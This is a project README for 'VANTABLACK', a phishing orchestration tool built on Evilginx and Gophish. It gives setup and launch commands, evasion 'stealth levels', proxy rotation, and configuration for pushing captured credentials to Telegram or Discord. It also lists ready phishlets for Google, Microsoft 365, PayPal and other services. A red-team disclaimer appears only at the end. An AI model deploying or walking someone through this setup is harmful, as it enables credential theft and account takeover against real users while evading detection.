# 🚀 VANTABLACK - Industrial Phishing Orchestrator

<p align="center">
  <img src="https://img.shields.io/badge/Version-3.1.0--Polymorph-grey" alt="Version">
  <img src="https://img.shields.io/badge/License-MIT--Industrial-black" alt="License">
  <img src="https://img.shields.io/badge/Security-Red--Team--Ready-red" alt="Security">
  <img src="https://img.shields.io/badge/Python-3.9+-blue" alt="Python">
  <img src="https://img.shields.io/badge/Docker-Ready-blue" alt="Docker">
</p>

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#-features)
- [Quick Start](#-quick-start)
- [Installation](#-installation)
- [Usage](#-usage)
- [Configuration](#-configuration)
- [Phishlets](#-phishlets)
- [API Reference](#-api-reference)
- [Troubleshooting](#-troubleshooting)
- [Security](#-security)

---

## 🎯 Overview

**VANTABLACK** is an elite, ultra-resilient orchestration platform designed for Red Team professionals. It manages high-performance interception engines (**Evilginx**) and campaign managers (**Gophish**) through a centralized, cloaked nervous system.

### What is VANTABLACK?

VANTABLACK is a command-and-control framework that simplifies the deployment and management of phishing campaigns. It provides:

- 🔒 **Secure Credential Capture** via Evilginx proxy
- 📧 **Email Campaign Management** via Gophish
- 🤖 **Automated Exfiltration** to Telegram/Discord
- 🛡️ **Advanced Evasion Techniques** for sandbox detection
- 📊 **Real-time Monitoring** dashboard
- 🐳 **Containerized Deployment** with Docker

---

## ✨ Features

### Core Features

| Feature | Description |
|---------|-------------|
| **Nervous System (API)** | Real-time injection of captures via FastAPI into a secure SQLite Vault |
| **Resilience Supervisor** | Proactive monitoring of resources (CPU/RAM) with auto-restart capabilities |
| **Polymorphic Cloaking** | Advanced sandbox and bot detection (GPU/Battery fingerprinting) |
| **Containerized Infrastructure** | One-Click deployment via Docker Compose |
| **Automated Exfiltration** | Instant data push to Telegram or Discord |

### Enhanced Features (v3.1)

- 🎨 **Interactive CLI Menu** - User-friendly navigation
- 📊 **Rich Dashboard** - Beautiful real-time monitoring
- ⚡ **Quick Setup Wizard** - Get started in minutes
- 🔄 **Auto-Update** - Stay current with latest features
- 📈 **Campaign Templates** - Pre-built phishing scenarios
- 🎯 **Multi-Target Support** - Simultaneous campaigns

---

## 🚀 Quick Start

### The Fast Way (30 seconds)

```bash
# 1. Clone and setup
git clone https://github.com/thesenegalesehitch/VANTABLACK.git
cd VANTABLACK

# 2. Run interactive setup
python3 vanta.py --setup

# 3. Launch!
python3 vanta.py
```

### Docker Way (Recommended)

```bash
# Start everything with one command
docker-compose up -d

# View dashboard
docker-compose logs -f
```

---

## 📦 Installation

### Prerequisites

| Requirement | Version | Notes |
|------------|---------|-------|
| Python | 3.9+ | Main runtime |
| Docker | 20.10+ | Container engine |
| Docker Compose | 2.0+ | Orchestration |
| Git | 2.0+ | Version control |

### Step 1: Clone the Repository

```bash
git clone https://github.com/thesenegalesehitch/VANTABLACK.git
cd VANTABLACK
```

### Step 2: Install Dependencies

```bash
# Python dependencies
pip3 install -r requirements.txt

# Or with uv (faster)
uv pip install -r requirements.txt
```

### Step 3: Configure

```bash
# Copy example config
cp hitch_config.yaml.example hitch_config.yaml

# Edit with your settings
nano hitch_config.yaml
```

### Step 4: Run the Setup Wizard

```bash
python3 vanta.py --setup
```

---

## 💻 Usage

### Interactive Mode (Recommended)

Simply run without arguments for the interactive menu:

```bash
python3 vanta.py
```

You'll see a beautiful menu like this:

```
╔══════════════════════════════════════════════════════════╗
║           VANTABLACK v3.1 - MAIN MENU                   ║
╠══════════════════════════════════════════════════════════╣
║  [1] 🚀  Start Campaign      - Launch phishing engines  ║
║  [2] 📊  View Dashboard      - Real-time monitoring     ║
║  [3] 🔍  Check Status        - System diagnostics       ║
║  [4] 📁  Manage Captures     - View/export credentials  ║
║  [5] ⚙️  Configuration       - Edit settings            ║
║  [6] 🐳  Docker Control      - Manage containers        ║
║  [7] 📖  Help                - Documentation            ║
║  [0] ❌  Exit                - Shutdown gracefully     ║
╚══════════════════════════════════════════════════════════╝
```

### Command Line Mode

#### Start with Stealth Level

```bash
# Level 1: Basic evasion
python3 vanta.py --stealth-level 1

# Level 3: Medium evasion (recommended)
python3 vanta.py --stealth-level 3

# Level 5: Maximum evasion
python3 vanta.py --stealth-level 5
```

#### With Notifications

```bash
# Telegram notifications
python3 vanta.py --notify telegram

# Discord notifications
python3 vanta.py --notify discord

# Both
python3 vanta.py --notify telegram --notify discord
```

#### With Proxy Rotation

```bash
# Use proxy list
python3 vanta.py --proxy-list proxies.txt

# Random proxy selection
python3 vanta.py --proxy-list proxies.txt --proxy-random
```

#### Advanced Options

```bash
# Full stealth mode
python3 vanta.py \
  --stealth-level 5 \
  --proxy-list proxies.txt \
  --notify telegram \
  --auto-kill \
  --multi-tenant

# Auto-kill on threat detection
python3 vanta.py --auto-kill

# Multi-domain management
python3 vanta.py --multi-tenant
```

---

## ⚙️ Configuration

### Main Configuration File

Edit `hitch_config.yaml`:

```yaml
name: "VANTABLACK"
version: "3.1.0"

# Telegram notifications
telegram:
  enabled: true
  token: "YOUR_BOT_TOKEN"
  chat_id: "YOUR_CHAT_ID"

# Discord notifications
discord:
  enabled: false
  webhook_url: "YOUR_WEBHOOK_URL"

# Evasion settings
evasion:
  stealth_level: 3
  sandbox_detect: true
  gpu_fingerprint: true
  battery_check: true
  automation_check: true
  vm_detect: true

# Proxy settings
proxy:
  enabled: false
  rotation: "round-robin"  # round-robin, random, sequential

# Logging
logging:
  level: "INFO"  # DEBUG, INFO, WARNING, ERROR
  file: "vanta.log"
```

### Environment Variables

```bash
# Export for persistent configuration
export VANTA_STEALTH_LEVEL=3
export VANTA_TELEGRAM_TOKEN=your_token
export VANTA_NOTIFY=telegram
```

---

## 🎣 Phishlets

VANTABLACK comes with pre-configured phishlets for popular targets:

| Phishlet | Target | Status |
|----------|--------|--------|
| `google` | Google Workspace | ✅ Ready |
| `microsoft` | Microsoft 365 | ✅ Ready |
| `facebook` | Facebook | ✅ Ready |
| `instagram` | Instagram | ✅ Ready |
| `linkedin` | LinkedIn | ✅ Ready |
| `twitter` | Twitter/X | ✅ Ready |
| `amazon` | Amazon | ✅ Ready |
| `paypal` | PayPal | ✅ Ready |
| `dropbox` | Dropbox | ✅ Ready |
| `o365` | Office 365 | ✅ Ready |

### Using Phishlets

```bash
# Start Evilginx with specific phishlets
./bin/evilginx -p ./phishlets -developer

# Available phishlets
ls phishlets/
```

---

## 📊 Monitoring & Dashboard

### Real-time Dashboard

```bash
# Launch the live monitoring dashboard
python3 monitor_captures.py
```

### System Status

```bash
# Check infrastructure health
python3 check_status.py
```

Output:
```
┌─────────────────────────────────────────┐
│     VANTABLACK: SYSTEM DIAGNOSTIC       │
├────────────────────┬────────────────────┤
│ Component          │ Status             │
├────────────────────┼────────────────────┤
│ Docker Container   │ ✅ Running         │
│ Vault Database     │ ✅ Accessible      │
│ Nervous System     │ ✅ Online (8000)   │
│ Exfiltration Bot  │ ✅ Ready           │
└────────────────────┴────────────────────┘
```

---

## 🔌 API Reference

### Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/capture` | Receive captured credentials |
| GET | `/status` | System health check |
| GET | `/captures` | List all captures |
| GET | `/captures/{id}` | Get specific capture |
| DELETE | `/capture/{id}` | Delete capture |
| POST | `/config/reload` | Reload configuration |

### Example Usage

```bash
# Check system status
curl http://localhost:8000/status

# Get all captures
curl http://localhost:8000/captures

# Delete a capture
curl -X DELETE http://localhost:8000/capture/123
```

---

## 🐳 Docker Commands

```bash
# Start all services
docker-compose up -d

# View logs
docker-compose logs -f

# Stop all services
docker-compose down

# Rebuild and start
docker-compose up -d --build

# Restart specific service
docker-compose restart vanta-nervous-system

# View running containers
docker ps

# View resource usage
docker stats
```

---

## 🔧 Troubleshooting

### Common Issues

#### Issue: "Database locked" error
```bash
# Fix permissions
chmod 755 data/
chmod 644 hitch_vault.db
```

#### Issue: "Port already in use"
```bash
# Check what's using the port
lsof -i :8000
lsof -i :443

# Kill the process
kill -9 <PID>
```

#### Issue: "Telegram bot not responding"
```bash
# Verify token
# 1. Open @BotFather on Telegram
# 2. Use /mybots to verify
# 3. Check chat_id with @userinfobot
```

#### Issue: "Evilginx not capturing"
```bash
# Check phishlets are loaded
./bin/evilginx -p ./phishlets -developer

# In Evilginx console:
phishlets
config ipv4 <your_ip>
```

---

## 🔐 Security & Ethics

### ⚠️ Important Disclaimer

This tool is intended for **authorized Red Team operations only**. 

- ✅ Legal penetration testing
- ✅ Authorized security assessments
- ✅ Educational purposes
- ❌ Unauthorized access
- ❌ Illegal activities
- ❌ Spamming or phishing

### Best Practices

1. **Always get written authorization** before any testing
2. **Use isolated environments** for testing
3. **Protect captured data** - encrypt at rest
4. **Follow engagement rules** - stay within scope
5. **Clean up after** - remove test data

---

## 📁 Project Structure

```
VANTABLACK/
├── bin/                    # Compiled binaries
│   ├── evilginx           # Phishing proxy
│   └── gophish            # Campaign manager
├── configs/               # Configuration files
├── data/                  # Database & data
├── deployment/            # Docker & deployment
├── engines/               # Go source code
├── phishlets/            # Phishing templates
├── vanta/                 # Python core
│   ├── core/             # Orchestrator, API, DB
│   ├── modules/          # Evasion, Exfiltration, Proxy
│   └── utils/            # Utilities
├── vanta.py              # Main entry point
├── check_status.py       # Health check
├── monitor_captures.py   # Live dashboard
├── hitch_config.yaml     # Main config
├── docker-compose.yml   # Container setup
└── requirements.txt     # Python deps
```

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/amazing-feature`
3. Commit changes: `git commit -m 'feat: Add amazing feature'`
4. Push to branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details.

---

## 🔗 Links

- 📖 [Documentation](https://github.com/thesenegalesehitch/VANTABLACK/wiki)
- 🐛 [Issues](https://github.com/thesenegalesehitch/VANTABLACK/issues)
- 💬 [Discussions](https://github.com/thesenegalesehitch/VANTABLACK/discussions)

---

<p align="center">
  <strong>VANTABLACK: Through the Looking Glass of Security</strong>
  <br>
  <sub>Version 3.1.0 | Built for Red Teams</sub>
</p>
